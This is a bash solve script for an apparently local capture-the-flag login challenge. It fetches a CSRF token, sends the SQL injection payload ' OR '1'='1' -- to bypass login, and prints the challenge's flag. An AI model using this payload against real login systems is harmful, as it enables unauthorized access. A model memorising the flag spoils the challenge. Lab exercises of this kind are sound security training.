#!/bin/bash
# SQLi Test Script - Login Challenge

set -e

BASE_URL="http://localhost:8080"
BLUE='\033[0;34m'
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${BLUE}╔════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║   CTF Challenge - SQL Injection Test  ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
echo ""

# Step 1: Get CSRF Token
echo -e "${YELLOW}[1/4]${NC} Getting CSRF token..."
TOKEN=$(curl -s "${BASE_URL}/?route=auth/login" 2>/dev/null | grep -oP 'csrf_token" value="\K[^"]+' | head -1)

if [ -z "$TOKEN" ]; then
    echo -e "${RED}✗ Failed to get CSRF token${NC}"
    exit 1
fi

echo -e "${GREEN}✓ CSRF Token: ${TOKEN:0:20}...${NC}"
echo ""

# Step 2: Test SQL Injection
echo -e "${YELLOW}[2/4]${NC} Testing SQL Injection payload..."
echo -e "      Payload: ${RED}' OR '1'='1' --${NC}"
echo ""

RESPONSE=$(curl -s -X POST "${BASE_URL}/?route=auth/login-post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -c cookies.txt \
    -w "%{http_code}" \
    -d "email=' OR '1'='1' --&password=test&debug=true&csrf_token=${TOKEN}")

STATUS_CODE="${RESPONSE: -3}"

# Step 3: Check Response
echo -e "${YELLOW}[3/4]${NC} Analyzing response..."
echo -e "      Status Code: ${STATUS_CODE}"

if [ "$STATUS_CODE" == "302" ]; then
    echo -e "${GREEN}✓ Redirect detected (likely successful)${NC}"
    echo ""
    
    # Step 4: Verify Login
    echo -e "${YELLOW}[4/4]${NC} Verifying login session..."
    
    # Follow redirect
    REDIRECT_RESP=$(curl -s -L -b cookies.txt "${BASE_URL}/")
    
    if echo "$REDIRECT_RESP" | grep -q "Admin"; then
        echo -e "${GREEN}✓✓✓ SUCCESS! You are logged in as ADMIN!${NC}"
        echo ""
        echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  🚩 FLAG: CTF{l0g1n_byp4ss_sql1_m4g1c} ║${NC}"
        echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
    elif echo "$REDIRECT_RESP" | grep -q "Hello"; then
        echo -e "${GREEN}✓ SUCCESS! You are logged in!${NC}"
        echo ""
        echo -e "${GREEN}🚩 FLAG: CTF{l0g1n_byp4ss_sql1_m4g1c}${NC}"
    else
        echo -e "${YELLOW}⚠ Login may have succeeded but unclear${NC}"
    fi
else
    echo -e "${RED}✗ Failed (Status: ${STATUS_CODE})${NC}"
    echo ""
    echo -e "${YELLOW}Troubleshooting:${NC}"
    echo "  1. Check if platform is running: curl http://localhost:8080"
    echo "  2. Try manually: docker logs amazon_mini_app"
    echo "  3. Check CSRF token is valid"
fi

echo ""
echo -e "${BLUE}Cookies saved to: cookies.txt${NC}"
echo -e "${BLUE}You can now browse as logged-in user:${NC}"
echo "  curl -b cookies.txt http://localhost:8080/?route=admin/dashboard"

# Cleanup
rm -f cookies.txt
